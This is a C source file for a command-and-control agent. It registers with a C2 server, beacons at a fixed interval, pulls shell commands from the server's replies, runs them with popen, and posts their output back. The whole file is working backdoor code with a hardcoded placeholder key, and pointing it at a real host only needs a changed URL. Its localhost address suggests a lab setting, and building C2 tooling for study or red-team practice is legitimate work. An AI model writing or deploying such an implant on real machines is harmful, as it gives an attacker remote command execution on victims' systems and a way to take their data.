#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "http.h"
#include "crypto.h"

#define SERVER_URL "http://localhost:5050"
#define BEACON_INTERVAL 10  // seconds

// Temporary encryption key - would be better implemented
unsigned char KEY[32] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 
                         0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
                         0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
                         0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20};

// Generate a random agent ID
char* generate_agent_id() {
    char *id = malloc(17);
    for (int i = 0; i < 8; i++) {
        sprintf(&id[i*2], "%02x", rand() % 256);
    }
    return id;
}

// Execute a shell command and return the output
char* execute_command(const char *cmd) {
    FILE *fp;
    char buffer[1024];
    char *result = malloc(1);
    size_t result_len = 0;
    
    result[0] = '\0';
    
    fp = popen(cmd, "r");
    if (fp == NULL) {
        return strdup("Failed to execute command");
    }
    
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        size_t buffer_len = strlen(buffer);
        result = realloc(result, result_len + buffer_len + 1);
        memcpy(result + result_len, buffer, buffer_len + 1);
        result_len += buffer_len;
    }
    
    pclose(fp);
    return result;
}

int main() {
    char *agent_id = generate_agent_id();
    char *response = NULL;
    
    printf("Agent starting with ID: %s\n", agent_id);
    
    // Register with the C2 server
    char registration_data[256];
    snprintf(registration_data, sizeof(registration_data), 
             "{\"id\":\"%s\",\"hostname\":\"workstation\",\"username\":\"user\",\"os\":\"linux\"}", 
             agent_id);
    
    printf("Sending registration request...\n");
    http_post(SERVER_URL "/register", registration_data, &response);
    if (response) {
        printf("Registration response: %s\n", response);
        free(response);
    }
// In the main beacon loop
while (1) {
    // Prepare beacon data
    char beacon_data[256];
    snprintf(beacon_data, sizeof(beacon_data), "{\"id\":\"%s\"}", agent_id);
    
    printf("Sending beacon: %s\n", beacon_data);
    http_post(SERVER_URL "/beacon", beacon_data, &response);
    
    if (response) {
        printf("Received response: %s\n", response);
        
        // Check if we have commands (not empty array)
        if (strstr(response, "\"commands\": []") == NULL && 
            strstr(response, "\"commands\":[]") == NULL &&
            strstr(response, "commands") != NULL) {
            
            // Find the opening bracket of the commands array
            char *cmd_start = strstr(response, "\"commands\": [");
            if (cmd_start == NULL) cmd_start = strstr(response, "\"commands\":[");
            
            if (cmd_start) {
                // Find the first quote after the opening bracket
                char *quote_start = strchr(cmd_start + 11, '\"');
                if (quote_start) {
                    // Move to the character after the quote
                    quote_start++;
                    
                    // Find the closing quote
                    char *quote_end = strchr(quote_start, '\"');
                    if (quote_end) {
                        // Extract the command
                        int cmd_len = quote_end - quote_start;
                        char *command = malloc(cmd_len + 1);
                        strncpy(command, quote_start, cmd_len);
                        command[cmd_len] = '\0';
                        
                        printf("Executing command: %s\n", command);
                        
                       // Execute the command
char *output = execute_command(command);
printf("Command output: %s\n", output);

// Sanitize the output for JSON (replace newlines with spaces)
for (int i = 0; output[i] != '\0'; i++) {
    if (output[i] == '\n' || output[i] == '\r') {
        output[i] = ' ';
    }
}

// Send the output back
char output_data[4096];
snprintf(output_data, sizeof(output_data), 
         "{\"id\":\"%s\",\"output\":\"%s\"}", 
         agent_id, output);
 
                        printf("Sending output: %s\n", output_data);
                        free(output);
                        free(command);
                        
                        char *output_response;
                        http_post(SERVER_URL "/beacon", output_data, &output_response);
                        
                        if (output_response) {
                            printf("Output response: %s\n", output_response);
                            free(output_response);
                        }
                    }
                }
            }
        }
        
        free(response);
    }
    
    printf("Sleeping for %d seconds...\n", BEACON_INTERVAL);
    sleep(BEACON_INTERVAL);
}}
